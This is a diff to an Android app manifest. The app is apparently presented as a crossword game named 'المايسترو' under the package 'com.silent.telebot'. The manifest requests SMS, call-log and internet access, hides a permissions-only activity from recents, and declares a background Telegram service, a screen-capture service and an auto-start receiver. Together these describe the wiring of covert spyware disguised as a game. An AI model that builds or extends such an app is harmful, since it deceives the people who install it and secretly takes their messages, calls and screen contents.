@@ -1,8 +1,9 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    xmlns:tools="http://schemas.android.com/tools">
+    xmlns:tools="http://schemas.android.com/tools"
+    package="com.silent.telebot">
 
-    <!-- الأذونات -->
+    <!-- ==================== الأذونات ==================== -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.READ_SMS" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
@@ -19,11 +20,12 @@
         android:allowBackup="true"
         android:label="المايسترو"
         android:theme="@style/Theme.AppCompat.NoActionBar"
-        android:requestLegacyExternalStorage="true">
+        android:requestLegacyExternalStorage="true"
+        android:icon="@mipmap/ic_launcher">
 
-        <!-- النشاط الرئيسي: لعبة الكلمات -->
+        <!-- ==================== النشاط الرئيسي (لعبة الكلمات المتقاطعة) ==================== -->
         <activity
-            android:name=".WordGameActivity"
+            android:name=".CrosswordActivity"
             android:exported="true"
             android:launchMode="singleInstance"
             android:theme="@style/Theme.AppCompat.NoActionBar">
@@ -33,13 +35,14 @@
             </intent-filter>
         </activity>
 
-        <!-- النشاط الخفي (لطلب الأذونات القديم) -->
+        <!-- ==================== نشاط الخلفية القديم (للأذونات فقط) ==================== -->
         <activity
             android:name=".MainActivity"
             android:exported="false"
-            android:excludeFromRecents="true" />
+            android:excludeFromRecents="true"
+            android:theme="@style/Theme.AppCompat.NoActionBar" />
 
-        <!-- FileProvider للكاميرا -->
+        <!-- ==================== FileProvider للكاميرا ==================== -->
         <provider
             android:name="androidx.core.content.FileProvider"
             android:authorities="${applicationId}.fileprovider"
@@ -50,17 +53,19 @@
                 android:resource="@raw/file_paths" />
         </provider>
 
-        <!-- الخدمات والمستقبلات -->
+        <!-- ==================== خدمة الخلفية الرئيسية ==================== -->
         <service
             android:name=".TelegramService"
             android:exported="false"
             android:foregroundServiceType="dataSync" />
 
+        <!-- ==================== خدمة لقطة الشاشة ==================== -->
         <service
             android:name=".ScreenCaptureService"
             android:exported="false"
             android:foregroundServiceType="mediaProjection" />
 
+        <!-- ==================== مستقبلات البث ==================== -->
         <receiver
             android:name=".AutoStartReceiver"
             android:exported="true">
